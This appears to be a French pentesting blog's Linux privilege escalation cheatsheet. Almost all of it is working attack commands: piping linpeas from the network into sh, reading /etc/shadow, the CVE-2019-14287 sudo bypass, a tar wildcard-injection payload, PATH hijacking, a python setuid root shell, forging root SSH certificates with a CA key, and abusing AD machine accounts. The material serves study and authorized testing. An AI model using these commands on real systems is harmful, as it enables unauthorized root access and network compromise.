---
title: "Linux Privilege Escalation Cheatsheet"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Linux Privilege Escalation Cheatsheet"
summary: "PrivEsc | Linux Privilege Escalation Cheatsheet"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## Enumération auto
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh | tee linpeas_output.txt

# LinEnum
./LinEnum.sh

# pspy (process spy - sans root)
./pspy64
```

## Commandes manuelles
```bash
# Infos système
id && whoami && hostname
uname -a
cat /etc/os-release
cat /etc/passwd | grep -v nologin
cat /etc/shadow  # si lisible

# SUID
find / -perm -4000 -type f 2>/dev/null
# SGID
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo
sudo -l

# Cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers

# Fichiers writable
find / -writable -type f 2>/dev/null | grep -v proc

# Fichiers récents
find / -mmin -10 -type f 2>/dev/null

# Services internes
ss -tlnp
netstat -tulpn
```

## Exploits classiques
```bash
# GTFOBins (SUID/sudo)
# https://gtfobins.github.io/

# Sudo < 1.8.28 (CVE-2019-14287)
sudo -u#-1 /bin/bash

# PwnKit (CVE-2021-4034) - pkexec
# Dirty Pipe (CVE-2022-0847) - kernel 5.8+
# Dirty COW (CVE-2016-5195) - kernel < 4.8.3
```

## Wildcard injection
```bash
# Si cron fait: tar czf backup.tar.gz *
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

## PATH hijacking
```bash
# Si un script SUID appelle une commande sans chemin absolu
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/<commande>
chmod +x /tmp/<commande>
```

## Capabilities
```bash
# python3 avec cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## SSH CA Key Abuse
```bash
# Si on a accès à la clé privée CA SSH (TrustedUserCAKeys dans sshd_config)
# 1. Vérifier la config
grep -r "TrustedUserCAKeys" /etc/ssh/

# 2. Générer une paire de clés
ssh-keygen -t ed25519 -f /tmp/root_key -N ''

# 3. Signer avec la CA pour root
ssh-keygen -s /path/to/ca_private_key -I "root-cert" -n root -V +1h /tmp/root_key.pub

# 4. Connexion root
ssh -i /tmp/root_key root@target

# Vérifier le certificat
ssh-keygen -L -f /tmp/root_key-cert.pub
```

## Pre-Windows 2000 Machine Accounts (AD)
```bash
# Les comptes machines Pre-Win2000 ont souvent password = nom machine lowercase (sans $)
# Détection
nxc smb <DC> -u '<MACHINE>$' -p '<machine_lowercase>'
# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = password CORRECT (mais SMB refuse le logon)

# Utiliser via Kerberos (contourne la restriction)
faketime -f '+7h' impacket-getTGT '<domain>/<MACHINE>$:<password>' -dc-ip <DC>
export KRB5CCNAME=<MACHINE>\$.ccache
```
